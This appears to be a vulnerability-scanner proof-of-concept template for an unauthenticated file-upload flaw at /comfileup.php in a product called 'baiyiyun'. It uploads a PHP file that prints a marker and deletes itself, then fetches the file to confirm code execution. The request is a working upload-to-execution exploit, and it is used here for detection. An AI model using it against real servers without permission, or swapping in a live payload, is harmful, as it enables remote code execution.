name: poc-yaml-baiyiyun-comfileup-File-upload
transport: http

rules:
  r0:
    request:
      method: POST
      path: /comfileup.php
      headers:
        Content-Type: multipart/form-data; boundary=--------1110146050
      body: "\
        ----------1110146050\r\n\
        Content-Disposition: form-data; name=\"file\";filename=\"rce.php\"\r\n\
        \r\n\
        <?php print(111*222);unlink(__FILE__);?>\r\n\
        ----------1110146050\r\n\
        "
    expression: response.status == 200
    output:
      search: '"vpath\":\"(?P<uploadfile>.*?\\.php)".bsubmatch(response.body)'
      uploadfile: search["uploadfile"]

  r1:
    request:
      method: GET
      path: /{{uploadfile}}
    expression: response.status == 200 && response.body.bcontains(b'24642')

expression: r0() && r1()

detail:
  author: Superhero
  links:
    - https://blog.csdn.net/m0_60571842/article/details/140770008
